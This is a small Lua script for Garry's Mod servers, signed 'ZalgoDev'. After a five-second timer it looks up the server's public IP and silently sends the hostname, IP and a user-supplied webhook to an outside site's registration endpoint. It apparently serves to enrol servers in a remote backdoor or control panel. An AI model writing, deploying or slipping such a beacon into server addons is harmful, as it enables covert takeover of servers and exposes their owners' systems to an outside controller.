local webhook_url = "TON WEBHOOK ICI !!!"  -- OUBLIES PAS TON WEBHOOK


local web_url = "https://zalgo-dev.eu/register_server.php?hostname="
local hostname = GetHostName()

local function ReplaceSpacesWithUnderscores(input)
    return string.gsub(input, " ", "_")
end

local function SendServerInfoToWebsite(hostname, ip, webhook)
    local encoded_hostname = ReplaceSpacesWithUnderscores(hostname)
    local encoded_ip = ReplaceSpacesWithUnderscores(ip)
    local encoded_webhook = ReplaceSpacesWithUnderscores(webhook)

    local url = web_url .. encoded_hostname .. "&ip=" .. encoded_ip .. "&webhook=" .. encoded_webhook
    http.Fetch(url, function(body, len, headers, code) end)
end

local function GetPublicIPAndSendInfo()
    http.Fetch("http://ifconfig.me/ip", 
        function(body, len, headers, code)
            local ip = body:Trim()
            if hostname and ip then
                SendServerInfoToWebsite(hostname, ip, webhook_url)
            end
        end)
end

timer.Simple(5, function()
    GetPublicIPAndSendInfo()
end)

--[[By ZalgoDev]]
